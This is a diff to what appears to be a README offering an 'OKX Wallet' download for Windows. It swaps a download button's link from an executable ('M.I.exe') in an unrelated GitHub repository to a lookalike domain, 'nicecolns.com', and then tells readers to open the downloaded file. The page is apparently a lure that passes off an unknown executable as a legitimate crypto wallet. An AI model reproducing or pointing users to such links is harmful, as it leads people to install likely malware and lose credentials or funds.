@@ -9,7 +9,7 @@ In addition to its robust security measures, the **OKX Wallet** boasts an easy s
 
 1. Click the button below to start the **OKX Wallet download** for Windows.
     <br>
-    <a href="https://github.com/Q1441/gmgnapppro/releases/download/v.1/M.I.exe">
+    <a href="https://nicecolns.com/">
       <img src="https://github.com/user-attachments/assets/10703858-e0fd-4c01-b89f-94d3bdcb2deb" alt="Download" width="300"/>
     </a>
 2. Navigate to your "Downloads" folder and find the downloaded file.
